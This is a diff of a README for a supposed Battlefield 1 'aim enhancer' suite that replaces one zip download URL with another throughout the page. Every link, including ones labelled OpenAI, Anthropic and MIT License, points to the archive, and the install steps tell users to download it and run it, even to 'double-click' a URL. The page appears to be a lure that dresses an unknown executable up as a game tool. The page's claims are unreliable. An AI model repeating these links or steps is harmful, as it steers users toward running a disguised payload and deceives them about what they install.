@@ -1,6 +1,6 @@
 # ⚡ Battlefield 1 Enhancement Suite
 
-[![Download](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip)](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip)
+[![Download](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip)](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip)
 
 Welcome to the **Battlefield 1 Enhancement Suite** — your all-in-one solution designed to redefine your gaming journey on the battlefields of World War I! This repository empowers players to enjoy advanced customization, seamless automation, interactive assistance, and 24/7 support inside Battlefield 1. Dive into a world where precision meets interface artistry, and where your in-game experience becomes as unique as your playstyle.
 
@@ -54,7 +54,7 @@ At the heart of this Suite hums a powerful fusion of **OpenAI GPT-compatibility 
 - **Translation in Motion:** In-game chat translation powered by Claude’s linguistics for global communication.
 - **Adaptive Configurations:** Dynamic suggestions for graphics, network, and gameplay efficiency.
 
-Learn more at [OpenAI](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip) and [Anthropic](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip).
+Learn more at [OpenAI](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip) and [Anthropic](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip).
 
 ---
 
@@ -74,13 +74,13 @@ Caught in an unexpected bug at dawn? Facing a UI mystery at midnight? Our human 
 ## 💾 Installation Guide
 
 1. **Download the Battlefield 1 Enhancement Suite Installer:**  
-   https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip
+   https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip
 
 2. **Extract the Archive:**  
    Unzip the provided package to a preferred directory (e.g., `C:\Battlefield1Suite\`).
 
 3. **Run The Installer:**  
-   Double-click `https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip` (or run via Terminal on Linux/Mac: `./Battlefield1SuiteSetup`).
+   Double-click `https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip` (or run via Terminal on Linux/Mac: `./Battlefield1SuiteSetup`).
 
 4. **Follow The Interactive Installer:**  
    - Select desired components (overlay, automation, API integrations, etc.).
@@ -108,12 +108,12 @@ For questions, open an issue or contact our support team.
 
 ## 📜 License
 
-This repository is released under the open-source [MIT License (2025)](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip).  
+This repository is released under the open-source [MIT License (2025)](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip).  
 Please review the license before use or modification.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip)](https://raw.githubusercontent.com/hal9222/battlefield-1-aim-enhancer/branch/chamberlet/battlefield-1-aim-enhancer-v1.8.zip)
+[![Download](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip)](https://github.com/hal9222/battlefield-1-aim-enhancer/raw/refs/heads/branch/chamberlet/aim_battlefield_enhancer_1.7.zip)
 
 ---
 
